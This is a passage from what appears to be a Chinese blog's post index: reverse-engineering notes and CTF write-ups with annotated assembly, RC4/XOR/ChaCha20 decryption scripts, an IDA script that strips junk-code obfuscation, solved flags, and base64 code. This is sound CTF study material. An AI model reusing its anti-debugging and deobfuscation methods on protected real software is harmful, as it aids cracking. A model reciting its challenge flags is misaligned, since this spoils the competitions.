  eax, [rbp+var_4]    ;获取str[rax]的值到eax.text:00000000004015DB                 cdqe                        ;继续把eax拓展成rax.text:00000000004015DD                 movzx   eax, [rbp+rax+Str]  ;获取str[rax]到eax，并无符号拓展.text:00000000004015E2                 movsx   eax, al             ;把eax的低字节拓展为.text:00000000004015E5                 mov     edx, [rbp+var_4]    ;再次获取var_4的值到edx.text:00000000004015E8                 movsxd  rdx, edx            ;带符号拓展为赋值到rdx.text:00000000004015EB                 lea     rcx, ds:0[rdx*4]  ;ds是一个说明，说明访问的数据段。0[]表示没有额外偏移量，表示从获取到的地址开始rax*4,就是获取rax*4的指针，4为一个数组的字节大小，rax的值就是偏移量，如果rax是1，那么表示的是获取到4索引的指针，即4字节数组的第二个元素。这里rax为0，那么rcx就是0，即rcx记录了一个由var_4决定的指针偏移量.text:00000000004015F3                 lea     rdx, res           ;获取res的指针到rdx.text:00000000004015FA                 mov     edx, [rcx+rdx]     ;获取res的第一个字节到edx.text:00000000004015FD                 cmp     eax, edx           ;把str与res进行比较判断.text:00000000004015FF                 jz      short loc_401614   ;相等则进行跳转.text:0000000000401601                 lea     rcx, aWrong        ; &quot;Wrong!&quot;.text:0000000000401608                 call    puts.text:000000000040160D                 mov     eax, 0.text:0000000000401612                 jmp     short loc_40162B.text:0000000000401614 ; ---------------------------------------------------------------------------.text:0000000000401614.text:0000000000401614 loc_401614:                                ; CODE XREF: main+AF↑j.text:0000000000401614                 add     [rbp+var_4], 1     ;相等则跳转到这里，把var_4的值加上1，.text:0000000000401618                 jmp     short loc_4015A2   ;返回循环起点继续循环.text:000000000040161A ; ---------------------------------------------------------------------------.text:000000000040161A.text:000000000040161A loc_40161A:                             ; CODE XREF: main+56↑j.text:000000000040161A                 lea     rcx, aGood      ; &quot;Good!&quot;.text:0000000000401621                 call    puts.text:0000000000401626                 mov     eax, 0.text:000000000040162B.text:000000000040162B loc_40162B:                             ; CODE XREF: main+46↑j.text:000000000040162B                                         ; main+C2↑j.text:000000000040162B                 add     rsp, 90h        ;把栈顶恢复成栈底，回收栈帧.text:0000000000401632                 pop     rbp             ;弹出rbp.text:0000000000401633                 retn                    ;函数返回.text:0000000000401633 main            endp                    ;函数结束hint = 0x21,0x6,0x6,0x16,0xb,0x19,0x2e,0x65,0x35,0x6a,0x6f,0x38,0x36,0x84,0x70,0x3b,0x39,0x65,0x38,0x35,0x84,0x6f,0x36,0x3c,0x6a,0x38,0x68,0x84,0x66,0x70,0x3b,0x38,0x6a,0x36,0x34,\n上面汇编的加密逻辑和逆向脚本#include &lt;stdio.h&gt;char str[] = &#123; 0x21,0x6,0x6,0x16,0xb,0x19,0x2e,0x65,0x35,0x6a,0x6f,0x38,0x36,0x84,0x70,0x3b,0x39,0x65,0x38,0x35,0x84,0x6f,0x36,0x3c,0x6a,0x38,0x68,0x84,0x66,0x70,0x3b,0x38,0x6a,0x36,0x34 &#125;;int enc() &#123;\tint len = 0x23;\tfor (int i = 0; i &lt; len; i++) &#123;\t\tstr[i] ^= 0x52;\t\tstr[i] += 5;\t&#125;\treturn 0;&#125;int dec() &#123;\tint len = 0x23;\tfor (int i = 0; i &lt; len; i++) &#123;\t\tstr[i] -= 5;\t\tstr[i] ^= 0x52;\t&#125;\treturn 0;&#125;int main() &#123;\tdec();\tprintf(&quot;%s&quot;, str);&#125;\n\n\n汇编进阶理解与堆栈栈操作与函数执行push a; 把esp-4,并把a的值赋值给esp指向的位置pop  a; 把当前esp赋值给a，再把esp+4\n我们取一段函数\nPUSH EBP          MOV  EBP,ESP    sub  esp,ncall enc;....              MOV  ESP,EBP    POP EBP        RETN         \n假设我们的这个函数是由别的地方call进来的,那么在call的时候执行了一下步骤。\n\n把call的下一条指令压入栈中，并把esp-4,即保存返回地址\n修改eip的值为被调用函数的开头\n进入被调用函数执行\npush ebp；把原函数的栈底指针压入栈，把esp-4,然后把ebp的值赋值给esp指向的地址即保存原来的栈底指针。\nmov ebp,esp;设置栈底指针为当前函数的开头。\nsub esp,n;用esp-n开辟新的栈帧，往下正常执行函数。\n…\nmov esp,ebp;回收栈帧，恢复栈顶指针到当前栈底\npop ebp;弹出保存栈底指针,把当前esp赋值给ebp，再把esp+4\nretn ;修改eip的值为esp指向的值，esp此时指向call的下一条指令的地址。\n\n","categories":["Re学习"],"tags":["re,学习"]},{"title":"2024春秋杯部分Re-wp+复现","url":"/2025/01/07/%E6%98%A5%E7%A7%8B%E6%9D%AF/","content":"day1earecustom_md5_init(seed);会检测断点，我们可以在输入和比较的数据下硬件断点，用写内存的方法把密文写回内存就可以在s1中看到flag。\\n\n密文:5C 76 4A 78 15 62 05 7C 6B 21 40 66 5B 1A 48 7A\\n\n1E 46 7F 28 02 75 68 2A 34 0C 4B 1D 3D 2E 6B 7A \n17 45 07 75 47 27 39 78 61 0B \n\nko0h前面的flag是假的，修一下jzjnz的花指令，可以看到主逻辑 \n\n魔改RC4\n\n密文在sub_402A70()里，”DDDDAAAASSSS”\n脚本如下\n#include&lt;stdio.h&gt; #include&lt;stdlib.h&gt;#include&lt;string.h&gt;//s 表的长度取 256#define size 256unsigned char sbox[257] = &#123; 0 &#125;;// 初始化 s 表void init_sbox(unsigned char* key) &#123;\tunsigned int i, j, k;\tint tmp;\tfor (i = 0; i &lt; size; i++) &#123;\t\tsbox[i] = i;\t&#125;\tj =k = 0;\tfor (i = 0; i &lt; size; i++) &#123;\t\ttmp = sbox[i];\t\tj = (j + tmp + key[i % strlen((char*)key)]) % size;  //注意此处的长度，自己计算一下密钥和数据的长度多次尝试\t\tsbox[i] = sbox[j];\t\tsbox[j] = tmp;\t\t/*if (++k &gt;= 12)\t\t\tk = 0;*/\t&#125;&#125;// 加解密函数void enc_dec(unsigned char* key, unsigned char* data) &#123;\tint i, j, k, R, tmp;\tinit_sbox(key);\tj = k = 0;\tfor (i = 0; i &lt; strlen((char*)data); i++) &#123;\t\tj = (j + 1) % size;\t\tk = (k + sbox[j]) % size;\t\ttmp = sbox[j];\t\tsbox[j] = sbox[k];\t\tsbox[k] = tmp;\t\tR = sbox[(sbox[j] + sbox[k]) % size];\t\tdata[i] += R;\t&#125;&#125;int main() &#123;\tunsigned char key[100] = &quot;DDDDAAAASSSS&quot;;\tunsigned char data[100] = &#123; 24,-100,71,61,59,-31,41,39,-97,52,-125,-43,-19,-75,110,89,127,-34,71,-41,101,63,122,51,91,100,-74,-6,-108,85,-121,66,32,6,12,105,-2,114,-87,-28,-47,124 &#125;;\tenc_dec(key, data);\tprintf(&quot;dec: %s\\n&quot;, data);\treturn 0;&#125;\n\n\nday3oooooore全是花指令，大概分为两种，jzjnz和callret，用脚本去花(脚本1)，去除花指令后可以看到main中的加密逻辑，看字符串表可以看到一个rc4密钥，还可以定位到输入的位置。\n\nmecpcy那里是密文，s是我们的输入。往下看我们的输入被传入了两个函数中，这应该就是加密函数了。第一个进去就是我们在字符串表看到的那个RC4。\n\n在第二个函数中我们可以在流程图中看到一些常数，按r可以看到他们的字符串”expand 32-byte k”，这个明显就是salsa20或者chacha20加密了，和RC4差不多本质就是一个异或，可以用写内存的方法解决。(其实这些找不到也没什么大问题，下面的动调可以解决一切)\n\n回到main函数，我们在输入的数据下硬件断点，输入一个正确长度的值进行动调，查看我们值的变化。这里我输入flag{aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa}，继续运行，同时看我们输入数据的变化。\n第一次改变在这里，有一个异或，发现数据来源于byte ptr [rcx+rdx]和[rbp-70h]，我们在00005555555593BF下断点就可以看到byte ptr [rcx+rdx]是我们的输入，[rbp-70h]是一个地址，指向的地址里面只有一个数据，我们给这个数据下硬件断点继续溯源（其实可以不用再溯源了，这里是为了深入了解）\n这次断在这个位置，上面的[rcx]是我们追踪的值，这个值来自byte ptr [rcx+rdx]，不过好像被覆盖了，我们下断点查看。里面就是一串表（有点像main函数里面第二个函数上面那些数据），下面还有RC4的密钥，但是不确定是哪个加密函数。取消全部的断点，只保留我们输入数据的硬件断点，继续运行。\n\n最后变化在这个位置，往前看看就能看到只有一个异或，还有一个RC4的盒，那么前面那个就是chacha20或者salsa20。(我们只需要知道加密只有两个异或就行)\n\n再进行一次动调，这次我们把我们把密文作为输入写内存，并在最后一个数据下硬件断点。运行到最后一步加密，再次查看就可以看到flag\n81 ED 7E 2F 93 B6 6F 8D 43 E5 C9 11 A9 F4 2B DB AD CB 45 66 FA DF A9 61 28 65 31 D7 80 D5 18 FE 25 6E 94 05 83 51 B5 42 D2 9D\n\n\n脚本1（去花）\nimport idautilsimport idcimport idaapidef nop_jzjnz(start_addr,endaddr,pattern):    length =len(pattern)    flag = 0    while start_addr &lt; endaddr:        getbytes =idc.get_bytes(start_addr,length) #获取指定范围内指定地址的字节码并返回成列表        if(getbytes[0]==pattern[0] and getbytes[3]==pattern[3] and getbytes[6] == pattern[6] ):  #匹配花指令模板            flag = 1            for i in range(length):                        idc.patch_byte(start_addr + i,0x90)  #nop            print(f&quot;success! nop 0x&#123;hex(start_addr)&#125; to 0x&#123;hex(start_addr + length -1)&#125; length:&#123;length&#125;&quot;)            start_addr += length - 1        start_addr += 1    if(flag == 0):        print(&quot;Not find!!!&quot;)        def nop_range(start_addr,end_addr):    while(start_addr &lt;= end_addr):        idc.patch_byte(start_addr,0x90)        start_addr += 1    print(f&quot;success! nop 0x&#123;start_addr&#125; to 0x&#123;end_addr&#125;&quot;)def remount():    try:        addr = idc.get_screen_ea()        func = idaapi.get_func(addr)        func_start = func.start_ea        idaapi.del_func(func_start)        idaapi.add_func(func_start)        print(f&quot;success!! remount the func in 0X&#123;func&#125;&quot;)    except Exception as a:        print(&quot;some errors occur, remount falrue&quot;)        print(f&quot;error : &#123;a&#125;&quot;)start_addr = 0x0001000 end_addr = 0x07378   pattern_callret = [0xE8, 0x00, 0x00, 0x00, 0x00, 0x48, 0x83, 0x04, 0x24, 0x08, 0xC3, 0xE8, 0x90, 0x90, 0x90]pattern_jzjnz3 = [0x0F, 0x85, 0x06, 0x00, 0x00, 0x00, 0x0F, 0x84, 0x01, 0x00, 0x00, 0x00, 0x21]nop_jzjnz(start_addr,end_addr,pattern_jzjnz3)nop_jzjnz(start_addr,end_addr,pattern_callret)\n\n\n\neasyasmsub_102C0\nseg002:0000 sub_102C0       proc near               ; CODE XREF: start+F↓pseg002:0000                 push    axseg002:0001                 push    bxseg002:0002                 push    cxseg002:0003                 push    siseg002:0004seg002:0004 loc_102C4:                              ; CODE XREF: sub_102C0+29↓jseg002:0004                 mov     bx, 1      ;设置标志默认为1，用于判断是否产生交换seg002:0007                 mov     cx, ds:0   ;设置循环次数为cx为一个地址ds:0，loop默认cx统计次数seg002:000B                 dec     cx\t\t\t;cx减一seg002:000C                 lea     si, ds:2   ;加载ds:2的地址到siseg002:0010seg002:0010 loc_102D0:                              ; CODE XREF: sub_102C0+22↓jseg002:0010                 mov     ax, [si]    seg002:0012                 cmp     ax, [si+2]  \t;比较[si]和[si+2]，即2字节组合比较seg002:0015                 jbe     short loc_102DF  ;若[si]&lt;[si+2]，跳转seg002:0017                 xchg    ax, [si+2]  ;交换seg002:001A                 mov     [si], axseg002:001C                 mov     bx, 0 ;设置bx为0记录产生交换seg002:001Fseg002:001F loc_102DF:                              ; CODE XREF: sub_102C0+15↑jseg002:001F                 add     si, 2seg002:0022                 loop    loc_102D0  ;cx != 0时跳转，遍历数据seg002:0024                 cmp     bx, 1    ;bx为1表示未产生交换，排序完毕seg002:0027                 jz      short loc_102EB ;排序完毕seg002:0029                 jmp     short loc_102C4 ;继续排序seg002:002B ; ---------------------------------------------------------------------------seg002:002Bseg002:002B loc_102EB:                              ; CODE XREF: sub_102C0+27↑jseg002:002B                 pop     siseg002:002C                 pop     cxseg002:002D                 pop     bxseg002:002E                 pop     axseg002:002F                 retnseg002:002F sub_102C0       endpseg002:002F\nstart\nseg002:004C                 public startseg002:004C start           proc nearseg002:004C                 mov     ax, seg seg000seg002:004F                 mov     ss, axseg002:0051                 mov     sp, 200hseg002:0054                 mov     ax, seg seg001seg002:0057                 mov     ds, axseg002:0059                 assume ds:seg001seg002:0059                 mov     es, axseg002:005B                 assume es:seg001seg002:005B                 call    sub_102C0 ;调用排序seg002:005E                 mov     dx, 0B2h ;输入存储位置，前两个字节存储数据的属性，所以数据从B4h开始seg002:0061                 mov     ah, 0Ahseg002:0063                 int     21h      ;阻断程序，用于输入       ; DOS - BUFFERED KEYBOARD INPUTseg002:0063                                         ; DS:DX -&gt; bufferseg002:0065                 mov     bl, byte ptr aWelcomeToChunq+5Dh ; &quot;&quot;seg002:0069                 mov     byte ptr [bx+0B4h], 24h ; &#x27;$&#x27;seg002:006E                 mov     cx, word ptr byte_10200  ;21seg002:0072                 add     cx, cx  ;42seg002:0074                 mov     bx, 0   ;偏移量seg002:0077seg002:0077 loc_10337:                              ; CODE XREF: start+3C↓jseg002:0077                 mov     al, [bx+0B4h] ;输入的数据seg002:007B                 mov     ah, [bx+2]  ;ds:(bx+2) 指向的数据（这里是单字节）seg002:007F                 xor     al, ah  ;两者异或seg002:0081                 mov     [bx+0B4h], al ;修改输入数据seg002:0085                 add     bx, 1  ;计数器(偏移量)加一seg002:0088                 loop    loc_10337 ;cx 不为0时继续异或，cx会被减一seg002:008A                 lea     di, word_102B4  ;加载输入seg002:008E                 lea     si, byte_1022C  ;加载密文seg002:0092                 call    sub_102F0  ;比较函数seg002:0095                 jnz     short loc_1035A  ;根据返回判断结果，错误seg002:0097                 jmp     short loc_10364  ;正确seg002:0097 ; ---------------------------------------------------------------------------seg002:0099                 align 2seg002:009Aseg002:009A loc_1035A:                              ; CODE XREF: start+49↑jseg002:009A                 mov     dx, 71h ; &#x27;q&#x27;seg002:009D                 mov     ah, 9seg002:009F                 int     21h             ; DOS - PRINT STRINGseg002:009F                                         ; DS:DX -&gt; string terminated by &quot;$&quot;seg002:00A1                 jmp     short loc_1036Eseg002:00A1 ; ---------------------------------------------------------------------------seg002:00A3                 align 2seg002:00A4seg002:00A4 loc_10364:                              ; CODE XREF: start+4B↑jseg002:00A4                 mov     dx, 9Bhseg002:00A7                 mov     ah, 9seg002:00A9                 int     21h             ; DOS - PRINT STRINGseg002:00A9                                         ; DS:DX -&gt; string terminated by &quot;$&quot;seg002:00AB                 jmp     short loc_1036Eseg002:00AB ; ---------------------------------------------------------------------------seg002:00AD                 align 2seg002:00AEseg002:00AE loc_1036E:                              ; CODE XREF: start+55↑jseg002:00AE                                         ; start+5F↑jseg002:00AE                 mov     dx, 57h ; &#x27;W&#x27;seg002:00B1                 mov     ah, 9seg002:00B3                 int     21h             ; DOS - PRINT STRINGseg002:00B3                                         ; DS:DX -&gt; string terminated by &quot;$&quot;seg002:00B5                 mov     ax, 4C00hseg002:00B8                 int     21h             ; DOS - 2+ - QUIT WITH EXIT CODE (EXIT)seg002:00B8 start           endp                    ; AL = exit codeseg002:00B8seg002:00B8 seg002          endsseg002:00B8seg002:00B8seg002:00B8                 end start\n解密脚本\ndata = [    0x2030, 0x3040, 0x4050, 0x1022, 0x2011, 0x1666, 0x1522, 0x8899,    0x4155, 0x4044, 0x4288, 0x3321, 0x6033, 0xFFFF, 0x2221, 0x3366,    0x222C, 0x2CCC, 0x22CC, 0xCC22, 0xC2C2]box = [    0x44, 0x7C, 0x43, 0x72, 0x1D, 0x72, 0x74, 0x41, 0x05, 0x14, 0x19, 0x1A,    0x19, 0x0F, 0xF5, 0x10, 0xAE, 0x18, 0x6D, 0x01, 0x10, 0x56, 0x00, 0x1E,    0x26, 0x71, 0x65, 0x73, 0x78, 0x72, 0xEB, 0x72, 0x52, 0x06, 0xAA, 0xBB,    0xA3, 0xA4, 0x1B, 0xFC, 0xC7, 0x82]for i in range(len(data)):    for j in range(len(data) - i -1):        if data[j] &gt; data[j+1]:            tmp = data[j]            data[j] = data[j+1]            data[j+1] = tmp# for i in data:#      print(f&quot;&#123;hex(i)&#125;,&quot;,end=&#x27;&#x27;)f = b&quot;&quot;for x in data:    b = x.to_bytes(2,&quot;little&quot;)  #小端序拆分成单字节    f += b#print(f.hex())hex_str = f.hex()# 将十六进制字符串按每8字节（即16个字符）分块，转为列表chunk_size = 2chunks = [hex_str[i:i+chunk_size] for i in range(0, len(hex_str), chunk_size)]# 将每个块转换为十进制并存入列表decimal_list = [int(chunk, 16) for chunk in chunks]result =list(i*0 for i in range(42))# 打印结果for d,b,i in zip(decimal_list,box,range(42)):    result[i] = d^bfor i in result:    print(chr(i),end=&#x27;&#x27;)#flag&#123;dea54885-92b4-11ef-b153-3c0af33af908&#125;\n\n","categories":["WriteUp"],"tags":["re,WriteUp"]},{"title":"2024强网杯青少年赛选拔赛Re-wp","url":"/2024/11/24/%E5%BC%BA%E7%BD%91%E6%9D%AF%E9%9D%92%E5%B0%91%E5%B9%B4%E8%B5%9B%E9%80%89%E6%8B%94%E8%B5%9Bre/","content":"原题提取码：95lk \nEnterGame一个chacha20加密，尝试用脚本解密不过好像不行，不知道是哪里的问题，可能是我密钥找错了。chacha20本质就是一个异或，我们可以把密文写入加密一次就可以得到原文。\n\n下断点在加密入口处，提取密文注意点进去把密文全部提取，一共有48字节“5E 13 AA D3 87 75 2B 7A 1B 16 04 A3 49 7E 1D D26B 5D 58 40 5E 44 63 59 48 51 0D 54 5E 58 55 58 AD 82 AF DC E7 AB 58 5D CE C1 FD F7 FF 7F 00 00”。我们再次动调，输入48字节数据作为输入，然后再次在加密入口处断点，修改input的值。\n\n用ida自带的chage byte就可以每十六字节进行修改。在比较的位置下一个断点继续运行查看s1的值就可以得到flag。\n\n\nFlip_over看java层主逻辑在validateAndEncrypt()函数里，在so文件里找到这个函数，大概逻辑的是取flagflag这个字符串作为密钥把”a4c3f8927d9b8e6d6e483fa2cd0193b0a6e2f19c8b47d5a8f3c7a91e8d4b9f67”先进行RC4加密再进行DES_ECB加密,最后再与0x21和密后的数据进行异或后，与密文比较。解密时提取数据，把异或逆一下，直接用赛博厨师解密。\n\n值得注意的是，我字自己了一个脚本用于获取异或的数据，然后我发现当c语言输出到01 00这类只有一位的十六进制数时，会省略掉前面的0，在用这一大串密钥异或时默认是两位一字节，如果没有前面的0，那么密钥就是错误的，所以我们要把0添加进去。如下面的注释。或者我们在输出十六进制数据时用空格隔开，这在赛博厨师里时不影响的。还有一种解决方案就是用”%.2x”的格式输出，指定输出2个十六进制数。\n\n \n #include &lt;stdio.h&gt;unsigned char data[] = &#123; 0x59,0x15,0xc1,0x3f,0x40,0x9a,0x7a,0xe7,0xa6,0x8b,0xb6,0xe3,0xee,0x0d,0x19,0x6d,0xb7,0x6d,0xca,0xe6,0xda,0x5f,0x0d,0x4b,0xd6,0x0a,0xb2,0xde,0xad,0xaa,0x95,0xeb,0x85,0xb7,0x77,0xc3,0x10,0xbb,0xcf,0xce,0xf7,0xd2,0x22,0xc9,0xc4,0xf9,0xfc,0xfb,0xab,0x32,0xea,0x31,0x81,0x55,0xaf,0x79,0x52,0x8e,0x80,0xaf,0xc3,0x18,0x60,0x50,0xf1,0xd8,0x40,0xbb,0xfc,0x1b,0x89,0xa6 &#125;;//赛博厨师解密的数据.int main() &#123;\tunsigned long long a[] = &#123; 0xF462D91A7981581E, 0x780001A9A6A79EE3,0x47141FC8F3C62DA6, 0xAFD0BEA1CBF14F95,0x89DDAB508133AF93,0x8EE2 &#125;;\tunsigned char result[42];\tfor (int i = 0; i &lt; 42; i++) &#123;\t\tprintf(&quot;%x,&quot;, *((unsigned char*)a + i));\t\tresult[i] = *((unsigned char*)a + i) ^ 0x21 ^ data[i];\t&#125;\tfor (int i = 0; i &lt; 42; i++) &#123;\t\tprintf(&quot;%c&quot;, *((unsigned char*)result + i));\t&#125;\t//1e5881791ad962f4e39ea7a6a9 1 0 78a62dc6f3c81f1447954ff1cba1bed0af93af338150abdd89e28e  //输出结果\t//1e5881791ad962f4e39ea7a6a9 01 00 78a62dc6f3c81f1447954ff1cba1bed0af93af338150abdd89e28e  //异或要用到的结果&#125;\n\n","categories":["WriteUp"],"tags":["re,WriteUp"]},{"title":"常见加密和编码","url":"/2024/12/31/%E5%B8%B8%E8%A7%81%E5%8A%A0%E5%AF%86/","content":"Base64一种基于64个可打印的字符来表示二进制的数据的一种方法。\nhttps://cloud.tencent.com/developer/article/1868972\n动画演示\n总的来说就是把原数据的二进制按3字节分块，后再按6位二进制分成4块，然后在每组二进制前面补00，变成8位（一块二进制内少于6位在末尾补0，三字节数据块内存在空字节就用等号补上。），按分块的二进制表示的值为索引到表中去寻找对应的元素。\n解码时按4字节到表中寻找元素后计算索引按三字节恢复就行。\n源码解读，来自\n https://gitcode.com/g310773517/base64/overview?isLogin=1\n#include &lt;stdio.h&gt;#include &lt;string.h&gt;#include &lt;stdlib.h&gt;#define _CRT_SECURE_NO_WARNINGS//base64查询表char* base64_encodetable = (char*)&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;;//base64反查询表char base64_decodetable[128] = &#123;     //把结果的索引与结果进行映射，可以直接按下标查找\t-1, -1, -1, -1, -1, -1, -1, -1, //0-7\t-1, -1, -1, -1, -1, -1, -1, -1, //8-15\t-1, -1, -1, -1, -1, -1, -1, -1, //16-23\t-1, -1, -1, -1, -1, -1, -1, -1, //24-31\t-1, -1, -1, -1, -1, -1, -1, -1, //32-39\t-1, -1, -1, 62, -1, -1, -1, 63, //40-47, + /\t52, 53, 54, 55, 56, 57, 58, 59, //48-55, 0-7\t60, 61, -1, -1, -1,  0, -1, -1, //56-63, 8-9\t-1,  0,  1,  2,  3,  4,  5,  6, //64-71, A-G\t 7,  8,  9, 10, 11, 12, 13, 14, //72-79, H-O\t15, 16, 17, 18, 19, 20, 21, 22, //80-87, P-W\t23, 24, 25, -1, -1, -1, -1, -1, //88-95, X-Z\t-1, 26, 27, 28, 29, 30, 31, 32, //96-103, a-g\t33, 34, 35, 36, 37, 38, 39, 40, //104-111, h-o\t41, 42, 43, 44, 45, 46, 47, 48, //112-119, p-w\t49, 50, 51, -1, -1, -1, -1, -1, //120-127, x-z&#125;;//数字字符串表static char* num_table = (char*)&quot;0123456789&quot;;//char类型数转换为2进制字符串格式, 如2-&gt;&quot;10&quot;, 6-&gt;&quot;110&quot;static char* char2binstr(char value)&#123;\tint i = 0;\tchar binstr[9] = &#123;&#125;;\t//取到每一位之后，查表得到对应的字符拼接成一个字符串\tfor (i = 0; i &lt; 8; i++)\t\tbinstr[7 - i] = num_table[(value &amp; (0x1 &lt;&lt; i)) &gt;&gt; i];\treturn _strdup(binstr);&#125;//2进制字符串格式数据转换为char类型数，如&quot;10&quot;-&gt;2, &quot;110&quot;-&gt;6static char binstr2char(char* binstr)&#123;\tint i = 0;\tchar value = 0;\tint length = 0;\tif (!binstr)\t\treturn 0;\tlength = strlen(binstr);\t//取得2进制字符串的每一个字节，将其转化对应的数字，然后还原数据。\tfor (i = 0; i &lt; length; i++)\t\tvalue += (binstr[length - 1 - i] - 0x30) &lt;&lt; i;\treturn value;&#125;/* * Base64编码说明 *  Base64编码要求把3个8位字节（3*8=24）转化为4个6位的字节（4*6=24），之后在6位的前面补两个0，形成8位一个字节的形式。 *  如果剩下的字符不足3个字节，则用0填充，输出字符使用&#x27;=&#x27;，因此编码后输出的文本末尾可能会出现1或2个&#x27;=&#x27;。 *  Base64制定了一个编码表，以便进行统一转换。编码表的大小为2^6=64，这也是Base64名称的由来。 */static char* _base64_section_encode(char* src, int length)&#123;\tint i = 0;\tchar dest[5] = &quot;====&quot;;\tchar binstr[33] = &quot;000000000000000000000000&quot;;\tchar tmp[7] = &#123;&#125;;\tchar* tmp1 = NULL;\t//每字节8位，每次转换3字节，不足3字节时，高位补0\t//先拼接一个完整的24字节2进制字符串\tfor (i = 0; i &lt; length; i++) &#123;\t\ttmp1 = char2binstr(src[i]);\t\tstrncpy((char*)binstr + i * 8, tmp1, 8);\t\tfree(tmp1);\t&#125;\t//24字节，分4组，每组6字节，将每组转换为数字格式,每个数字查表得到对应码。\t//3种情况：\t// 1. 如果最后剩下1个数据，编码结果后加2个=，即查表2次，查表次数正好是数据字节数 + 1\t// 2. 如果最后剩下2个数据，编码结果后加1个=，即查表3次\t// 3. 如果没有剩下任何数据(剩下3个数据)，就什么都不要加,即查表4次\tfor (i = 0; i &lt; length + 1; i++) &#123;\t\tstrncpy(tmp, binstr + 6 * i, 6);\t\tdest[i] = base64_encodetable[binstr2char(tmp)];\t&#125;\treturn _strdup(dest);&#125;//输入原始内容和长度，得到base64编码char* base64_encode(char* src, int length)&#123;\tint i = 0;\tchar* base64code = NULL;\tint codelength = 0;\tchar* tmp = NULL;\t//每3个字节一组转化为4字节（每6位一组得到4组，转换为新字符），不足3字节的填充到3字节进行转化。\t//因此计算共有多少组转换后的4字节乘以4就是编码后的长度\tcodelength = ((length / 3) + (length % 3 &gt; 0 ? 1 : 0)) * 4;\tbase64code = (char*)malloc(codelength + 1);\tmemset(base64code, 0, codelength + 1);\tfor (i = 0; i &lt; length / 3; i++) &#123;\t\ttmp = _base64_section_encode(src + i * 3, 3);\t\tstrcat(base64code, tmp);\t\tfree(tmp);\t&#125;\tif (length % 3) &#123;\t\ttmp = _base64_section_encode(src + length - (length % 3), length % 3);\t\tstrcat(base64code, tmp);\t\tfree(tmp);\t&#125;\treturn base64code;&#125;//4字节反转化为3字节static char* _base64_section_decode(char* dest)&#123;\tint i = 0;\tint j = 0;\tstatic char src[3] = &#123;&#125;;\tchar tmp[9] = &#123;&#125;;\tmemset(src, 0, sizeof(src) / sizeof(src[0]));\tfor (i = 0; i &lt; 3; i++) &#123;\t\tstrncpy(tmp, dest + 8 * i, 8);\t\tsrc[i] = binstr2char(tmp);\t&#125;\treturn src;&#125;int base64_decode_length(char* src)&#123;\tint length = 0;\tint padding_count = 0;\tif (src[strlen(src) - 1] == &#x27;=&#x27;)\t\tpadding_count++;\tif (src[strlen(src) - 2] == &#x27;=&#x27;)\t\tpadding_count++;\tlength = strlen(src) / 4 * 3 - padding_count;\treturn 0;&#125;//输入base64编码后文本，解码出原始内容char* base64_decode(char* src, int* destlen)&#123;\tint i = 0;\tint j = 0;\tchar* binstr = NULL;\tint binstr_length = 0;\tchar* tmp = NULL;\tchar* tmp1 = NULL;\tchar* dest = NULL;\tint cnt = 0;\tbinstr_length = strlen(src) * 8 + 1;\tbinstr = (char*)malloc(binstr_length);\tmemset(binstr, 0, binstr_length);\t*destlen = base64_decode_length(src);\tdest = (char*)malloc(*destlen);\tmemset(dest, 0, *destlen);\tfor (i = 0; i &lt; strlen(src) / 4; i++) &#123;\t\tfor (j = 0; j &lt; 4; j++) &#123;\t\t\ttmp1 = char2binstr(base64_decodetable[src[i * 4 + j]]);\t\t\tstrcat(binstr, tmp1 + 2);\t\t\tfree(tmp1);\t\t&#125;\t&#125;\tfor (i = 0; i &lt; strlen(src) / 4; i++) &#123;\t\t//因为_base64_section_decode函数每次固定返回3字节数据，此处需要根据提前计算出来的解码总长度和已解码长度来判断最后1次需要拷贝的准确数据量。\t\ttmp = _base64_section_decode(binstr + i * 24);\t\tmemmove(dest + i * 3, tmp, *destlen - cnt &lt; 3 ? *destlen - cnt : 3);\t\tcnt += 3;\t&#125;\tfree(binstr);\treturn dest;&#125;int main() &#123;\tchar a[10] = &quot;systema&quot;;\tchar * b = base64_encode(a, strlen(a));\tprintf(&quot;%s&quot;, b);&#125;\n一般形式（特征）#include&lt;stdio.h&gt;#include&lt;stdlib.h&gt;#include&lt;string.h&gt;char* encodeBase64(char* str, int len ) &#123;    char base64[65] = &quot;stuvwxyz0123456789+/ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqr&quot;;    //读取3个字节zxc，转换为二进制01111010 01111000 01100011    //转换为4个6位字节，011110 100111 100001 100011    //不足8位在前补0，变成00011110 00100111 00100001 00100011    //若剩余的字节数不足以构成4个字节，补等号    int encodeStrLen = 1 + (len / 3) * 4, k = 0;    encodeStrLen += len % 3 ? 4 : 0;    char* encodeStr = (char*)(malloc(sizeof(char) * encodeStrLen));    for (int i = 0; i &lt; len; i++) &#123;        if (len - i &gt;= 3) &#123;            encodeStr[k++] = base64[(unsigned char)str[i] &gt;&gt; 2];            unsigned char a = ((unsigned char)str[i] &amp; 0x03) ;            unsigned char b = (unsigned char)str[++i];            unsigned char c = a &lt;&lt; 4 | b &gt;&gt; 4;            encodeStr[k++] = base64[ c];            a = ((unsigned char)str[i] &amp; 0x0f);            b = (unsigned char)str[++i];            c = a &lt;&lt; 2 | b &gt;&gt; 6;            encodeStr[k++] = base64[c ];            encodeStr[k++] = base64[(unsigned char)str[i] &amp; 0x3f];        &#125;        else if (len - i == 2) &#123;            encodeStr[k++] = base64[(unsigned char)str[i] &gt;&gt; 2];            encodeStr[k++] = base64[((unsigned char)str[i] &amp; 0x03) &lt;&lt; 4 | ((unsigned char)str[++i] &gt;&gt; 4)];            encodeStr[k++] = base64[((unsigned char)str[i] &amp; 0x0f) &lt;&lt; 2];            encodeStr[k++] = &#x27;=&#x27;;        &#125;        else &#123;            encodeStr[k++] = base64[(unsigned char)str[i] &gt;&gt; 2];            encodeStr[k++] = base64[((unsigned char)str[i] &amp; 0x03) &lt;&lt; 4];                                                                                                              //末尾补两个等于号            encodeStr[k++] = &#x27;=&#x27;;            encodeStr[k++] = &#x27;=&#x27;;        &#125;    &#125;    encodeStr[k] = &#x27;\\0&#x27;;    return encodeStr;&#125;/*** 解码既编码的逆过程，先找出编码后的字符在编码之前代表的数字* 编码中将3位个字符变成4个字符，得到这4个字符的每个字符代表的原本数字* 因为在编码中间每个字符用base64码表进行了替换，所以这里要先换回来* 在对换回来的数字进行位运算使其还原成3个字符*/int decodeBase64(char* str, int len) &#123;    char base64[65] = 